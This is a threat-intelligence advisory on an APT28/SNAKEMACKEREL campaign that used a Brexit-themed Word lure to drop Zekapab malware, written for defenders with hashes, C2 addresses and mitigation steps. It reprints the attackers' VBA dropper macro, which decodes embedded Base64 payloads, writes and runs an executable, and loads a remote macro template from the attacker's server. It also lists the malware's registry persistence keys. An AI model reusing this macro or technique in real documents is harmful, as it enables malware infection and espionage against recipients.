    "plain_text": "# CYBER\n\n\n## SNAKEMACKEREL\n\n### A BREXIT-themed lure document that  delivers ZEKAPAB malware\n\n\n# ADVISORY\n\n\n-----\n\n##### As the United Kingdom (UK) Prime Minister Theresa May announced the initial BREXIT draft agreement with the European Union (EU), iDefense analysts identified a new campaign by SNAKEMACKEREL using a BREXIT-themed lure document to deliver the Zekapab (also known as Zebrocy) first-stage malware.\n\n\n#### WHAT’S THE STORY?\n\n\nSNAKEMACKEREL is an espionage-motivated cyber threat group, also known as\nSofacy, Pawn Storm, Sednit, Fancy Bear, APT28, Group 74, Tsar Team, and Strontium.\n\nBoth the British and Dutch governments have publicly attributed SNAKEMACKEREL\nactivities to the Russian military intelligence service (RIS)[1] and have linked specific\ncyberattacks to the group, including the targeting of the Organisation for the\nProhibition of Chemical Weapons (OPCW)[2], the United Kingdom Defence and Science\nTechnology Laboratory (DSTL) and the United Kingdom Foreign and Commonwealth\nOffice (FCO).\n\nIn foreign countries, RIS actors conducted damaging and/or disruptive cyberattacks,\nincluding attacks on critical infrastructure networks. In some cases, RIS actors\n“masqueraded as third parties, hiding behind false online personas designed to cause\nthe victim to misattribute the source of the attack.”\n\nAccording to the FBI, the SNAKEMACKEREL threat group \"is part of an ongoing\ncampaign of cyber-enabled operations directed at the United States government and\nits citizens. These cyber operations have included spear phishing campaigns\ntargeting government organizations, critical infrastructure entities, think tanks,\nuniversities, political organizations, and corporations, leading to the theft of\ninformation.\n\n###### WHAT DOES IT MEAN?\n\nThe creation of this malicious document, coming on the same day that the UK\ngovernment announced an initial agreed draft of the BREXIT agreement, suggests\nthat SNAKEMACKEREL is a group that pays close attention to political affairs and is\nable to leverage the latest news headlines to develop lure documents to deliver firststage malware, such as Zekapab, to its intended targets. The theme also reflects the\n\n1 https://www.ncsc.gov.uk/news/reckless-campaign-cyber-attacks-russian-military-intelligence-service\nexposed\n2 https://www.gov.uk/government/news/joint-statement-from-prime-minister-may-and-prime-minister-rutte\n\n\n-----\n\ntargeting of the group which primarily focuses on NATO members, countries in\nCentral Asia and those neighboring Russia.\n\nGiven the assumed association with the Russian military service, it is clear that the\ngroup has significant resources to target and compromise organizations. As a result,\nit requires extra investment in defensive measures. To protect the confidentiality,\nintegrity and availability of business operations, Accenture Security recommends that\norganizations ensure their staff members receive security hygiene training and deploy\nintelligence-driven network and host-based defensive measures.\n\n###### WHY DOES IT MATTER?\n\nDespite the public reporting and government accusations, SNAKEMACKEREL remains\nhighly active. It is behind a large number of cyberattacks targeting global aerospace\nand defense contractors, military units, political parties, the International Olympic\nCommittee (IOC), anti-doping agencies, government departments and various other\nverticals. NATO and EU member countries, as well as the United States, are of\nparticular interest to the group.\n\nSNAKEMACKEREL operations continue to be some of the most far-reaching and\nsophisticated cyber espionage and intelligence campaigns to date.\n\n\n-----\n\n###### HOW TO USE THIS REPORT\n\niDefense, part of Accenture Security, is providing information about this reported\nSNAKEMACKEREL campaign to highlight the modus operandi of a highly active\nthreat group that is targeting institutions, presumably for espionage purposes.\n\n**INTENDED AUDIENCE**\n\nThis intelligence alert is relevant for security operations center (SOC) analysts and\nengineers, intelligence analysts and management, and executive leadership.\n\n**HOW TO USE THIS INTELLIGENCE**\n\nSOC analysts and engineers can use this alert’s detailed information pertaining to\nthe workings of the malware families and indicators of compromise (IoCs) to\ncontain or mitigate the discussed threat through monitoring or blocking. SOC\nanalysts can use the information provided in the analysis and mitigation sections\nof this alert for hunting activities for systems that may have been compromised\nalready. Analysts and security engineers can use the IoCs by adding them to\nhunting lists on Endpoint Detection and Response (EDR) solutions, as well as\nnetwork- and host-based blacklists to detect and deny malware implantation and\ncommand-and-control (C2) communication.\n\nIntelligence analysts may want to use the information provided in this alert to\nbetter inform their own analyses. The information can also help inform ongoing\nintelligence analyses and forensic investigations, particularly with respect to\ncompromise discovery, damage assessment, and attribution.\n\nManagement and executive leadership may use this information to assess the risks\nassociated with the threat described to make the appropriate operational and\npolicy decisions.\n\nKnowledge of SNAKEMACKEREL's tactics, techniques, and procedures (TTPs)\nhelps to better inform detection and response to attacks by this threat group.\n\n\n-----\n\n#### TECHNICAL ANALYSIS\n\n\nThis report provides a technical overview of a BREXIT-themed lure Microsoft Office\ndocument that is used to drop a Delphi version of the Zekapab first-stage malware\nwhich has been previously reported by iDefense analysts. However, additional\nresearch on the C2 server 109.248.148.42 revealed a new .NET version of Zekapab\nthat is designed for the same purpose.\n\n###### MALWARE ANALYSIS\n\niDefense analysts recently came across the following malicious document that is\npurportedly related to the recent BREXIT negotiations between the UK and the EU.\n\nThe file has the following metadata:\n\n- **Filename: Brexit 15.11.2018.docx**\n\n- **MD5: 405655be03df45881aa88b55603bef1d**\n\n- **File size: 18.9 KB (19354 bytes)**\n\n- **Author: USER**\n\n- **Last modified by: Joohn**\n\n- **Company: Grizli777**\n\n- **Creation date: 2018:11:14 14:17:00**\n\n- **Modified date: 2018:11:15 04:50:00**\n\nOf note, the Company name Grizli777 is indicative of a cracked version of\nMicrosoft Word.\n\nTo trick the targeted individual into enabling macros, the attackers deliberately used\njumbled-up text as content (see Exhibit 1):\n\n\n-----\n\n**Exhibit 1. Jumbled up text in the lure document to trick users into enabling macros**\n\nThe document loads malicious content from\n```\nhxxp://109.248.148.42/office/thememl/2012/main/attachedTemplate.dotm\n\n```\nvia the settings.xml.rels component that is embedded within the DOCX\ndocument (see Exhibit 2):\n\n**Exhibit 2. Malicious macro-enabled content loaded via settings.xml.rels**\n\nThe downloaded macro component includes a function called AutoClose() (see\nExhibit 3) as well as two payloads embedded via Base64 encoded strings:\n\n\n-----\n\n**Exhibit 3. AutoClose() macro function**\n\nThe code snippet below shows the core macro code that is identical to the macro\n[code in an earlier campaign in April 2018 as reported by ESET:](https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/)\n\n```\nPublic Function FolderExists(FolderPath As String) As Boolean\nOn Error Resume Next\n ChDir FolderPath\n If Err Then FolderExists = False Else FolderExists = True\nEnd Function\nFunction FileExists(fname) As Boolean\n  On Error Resume Next\n  FileExists = Dir(fname) <> vbNullString\n  If Err.Number <> 0 Then FileExists = False\n  On Error GoTo 0\nEnd Function\nSub AutoClose()\n Dim vFileName As String\n Dim vDocName As String\n Application.ActiveWindow.WindowState = wdWindowStateMinimize\n vAdd = \"ntslwin.\"\n vFileName = Environ(\"APPDATA\") & \"\\NetworkNV\\\"\n\n```\n\n-----\n\n```\n If Not FolderExists(vFileName) Then MkDir (vFileName)\n vFileName = vFileName + vAdd & \"exe\"\n If Not FileExists(vFileName) Then SaveFN vFileName, convText(Us\nerForm1.Label2.Caption)\n 'Sleep 2002\n vDocName = Environ(\"TEMP\") & \"\\~de03fc12a.docm\"\n If Not FileExists(vDocName) Then SaveFN vDocName, convText(User\nForm1.Label1.Caption)\n zyx (vDocName)\n Application.Quit\nEnd Sub\nPrivate Function convText(dsf)\nDim dm, el\n Set dm = CreateObject(\"Microsoft.XMLDOM\")\n Set el = dm.CreateElement(\"tmp\")\n el.DataType = \"bin.base64\"\n el.Text = dsf\n convText = el.NodeTypedValue\nEnd Function\nPrivate Sub SaveFN(vNum, vBun)\n Dim binaryStream\n Set binaryStream = CreateObject(\"ADODB.Stream\")\n  binaryStream.Type = 1\n  binaryStream.Open\n  binaryStream.Write vBun\n  binaryStream.SaveToFile vNum, 2\nEnd Sub\nPublic Function zyx(vF)\n Dim WA As Object, oMyDoc As Object\n Set WA = CreateObject(\"Word.Application\")\n WA.Visible = False\n Set oMyDoc = WA.Documents.Open(vF)\n WA.Application.Run \"Module1.Proc1\"\n Set oMyDoc = Nothing: Set WA = Nothing\nEnd Function\nPublic Function WriteBinary(strBinary, strPath)\n  Dim oFSO: Set oFSO = CreateObject(\"Scripting.FileSystemObject\n\")\n  Dim oTxtStream\n\n```\n\n-----\n\n```\n  On Error Resume Next\n  Set oTxtStream = oFSO.createTextFile(strPath)\n  Set oTxtStream = Nothing\n  With oFSO.createTextFile(strPath)\n    .Write (strBinary)\n    .Close\n  End With\nEnd Function\n\n```\n\nResearch on the malicious IP address 109.248.148.42 revealed two different .dotm\ncomponents:\n\n- **Filename: attachedTemplate.dotm**\n\n- **MD5: 018611b879b2bbd886e86b62484494da**\n\n- **File size: 1.5 MB (1612982 bytes)**\n\n- **Filename: templates.dotm**\n\n- **MD5: 2a794b55b839b3237482098957877326**\n\n- **File size: 1.2 MB (1228358 bytes)**\n\nThe two components are dropped from the following URLs respectively:\n```\nhxxp://109.248.148.42/office/thememl/2012/main/attachedTemplate.dotm\nhxxp://109.248.148.42/officeDocument/2006/relationships/templates.dotm \n\n```\nBoth components contain an identical VBA macro code as shown above, each\ncontaining two different embedded payloads: one is an executable binary file and the\nother is a .docm file.\n```\nattachedTemplate.dotm dropped the following:\n\n```\n- **Filename: ntslwin.exe**\n\n- **MD5: 7e67122d3a052e4755b02965e2e56a2e**\n\n- **File size: 384.0 KB (393216 bytes)**\n\n- **File type: UPX compressed Win32 Executable**\n\n- **Filename: ~de03fc12a.docm**\n\n- **MD5: 9d703d31795bac83c4dd90527d149796**\n\n- **File size: 384.0 KB (24659 bytes)**\n\n\n-----\n\n```\ntemplates.dotm dropped the following:\n\n```\n- **Filename: ntslwin.exe**\n\n- **MD5: a13c864980159cd9bdc94074b2389dda**\n\n- **Compilation timestamp: 2018-11-13 10:45:42**\n\n- **File size: 32.0 KB (32768 bytes)**\n\n- **File type: PE32 executable for MS Windows (GUI) Intel 80386 32-bit Mono/.Net**\nassembly\n\n- **Filename: ~de03fc12a.docm**\n\n- **MD5: 9d703d31795bac83c4dd90527d149796**\n\n- **File size: 384.0 KB (24659 bytes)**\n\nThe second macro file ~de03fc12a.docm dropped includes a simple macro to\nexecute the dropped executable. The code snippet below shows the embedded\nmacro code:\n\n```\nSub Proc1()\n Dim vFileName As String\n Dim add As String\n vAdd = \"ntslwin.\"\n vFileName = Environ(\"APPDATA\") & \"\\NetworkNV\\\"\n vFileName = vFileName + vAdd & \"exe\"\n Shell vFileName\n Application.Quit\nEnd Sub\n\n```\n\nAnalysis into the two binaries shows that they are in fact a Delphi (initially UPX\npacked) and .NET version of the Zekapab first-stage malware.\n\nThe following network traffic is performed by the Delphi sample which has the\nfollowing metadata once unpacked by UPX:\n\n- **Filename: ntslwin.exe**\n\n- **MD5: f4cab3a393462a57639faa978a75d10a**\n\n- **File size: 984.5 KB (1008128 bytes)**\n\n- **File type: Win32 Executable Borland Delphi 7**\n\n\n-----\n\nExhibit 4 shows the network traffic generated by the sample, a HTTP POST request\ncontaining the system information collected. As shown, the data sent appears to be\nURL encoded:\n\n**Exhibit 4. Network traffic from the Delphi version of Zekapab**\n\nOn the other hand, the network traffic generated by the .NET version is unencoded\n(see Exhibit 5).\n\n\n-----\n\n**Exhibit 5. Network traffic from the .NET version of Zekapab**\n\nBoth versions are designed to collect system information and running processes and\nsend them to the designated C2 server using HTTP POST to the URI used in both\ncases is /agr-enum/progress-inform/cube.php?res=.\n\nIf the system is deemed interesting, the next stage malware would be delivered into\ncorresponding directories.\n\nThe second-stage malware is delivered to different destinations with an autorun\nregistry key set respectively.\n\nFor the Delphi version, the following registry key and value are used for persistence:\n\nKey: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AudioMgr\nValue: %AppData%\\Video\\videodrv.exe\n\nFor the .NET version, the following registry key and value are used for persistence:\n\nKey: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\GoogleIndexer\nValue: %AppData%\\Platform\\sslwin.exe\n\n\n-----\n\nThe function for collecting data as shown in the .NET version is as follows:\n\n**Exhibit 6. Data collection by the .NET version of Zekapab**\n\nThe list of information collected includes:\n\n- Results from the commands systeminfo and tasklist\n\n- Current execution path\n\n- Capture screenshot\n\n- Drive enumeration\n\n- Drive serial number\n\nThe code for downloading and executing the next stage malware, with the\npersistence mechanism set is as follows:\n\n**Exhibit 7. Next stage malware download and persistence set by the .NET version of**\nZekapab\n\n\n-----\n\nAs shown, the delivery of the next-stage malware is dependent on the\ninformation collected.\n\n###### MITIGATION\n\nTo mitigate the threat described in this report, iDefense recommends blocking access\nto the IP address and URI pattern:\n\n- 109.248.148.42\n\n- /agr-enum/progress-inform/cube.php?res=\n\nFor threat hunting, iDefense recommends searching for the following:\n\n**Network: Presence of HTTP and DNS traffic to the network IOCs shared above.**\n\n**System: Presence of the following artifacts.**\n\nPersistence mechanism(s)\n\nRegistry Key:\n\n**Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AudioMgr**\n\n**Key:** `HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\GoogleInde`\n```\n  xer\n\n```\nOn disk artefacts\n\n`o` File with the full path: %AppData%\\Video\\videodrv.exe\n\n`o` File with the full path: %AppData%\\Platform\\sslwin.exe\n\n`o` Files with following file hashes.\n\nFile hashes:\n\n405655be03df45881aa88b55603bef1d\n7e67122d3a052e4755b02965e2e56a2e\na13c864980159cd9bdc94074b2389dda\n9d703d31795bac83c4dd90527d149796\n\n\n-----\n\n#### CONTACT US\n\n\nRobert Coderre\n\n[robert.c.coderre@accenture.com](mailto:robert.c.coderre@accenture.com)\n\nJayson Jean\n\n[jayson.jean@accenture.com](mailto:jayson.jean@accenture.com)\n\nEmily Cody\n\n[emily.a.cody@accenture.com](mailto:emily.a.cody@accenture.com)\n\nMichael Yip\n[michael.yip@accenture.com](mailto:michael.yip@accenture.com)\n\nValentino De Sousa\nvalentino.de.sousa@accenture.com\n\n\n-----\n\n###### ABOUT ACCENTURE\n\nAccenture is a leading global professional services company, providing a broad range of\nservices and solutions in strategy, consulting, digital, technology and operations.
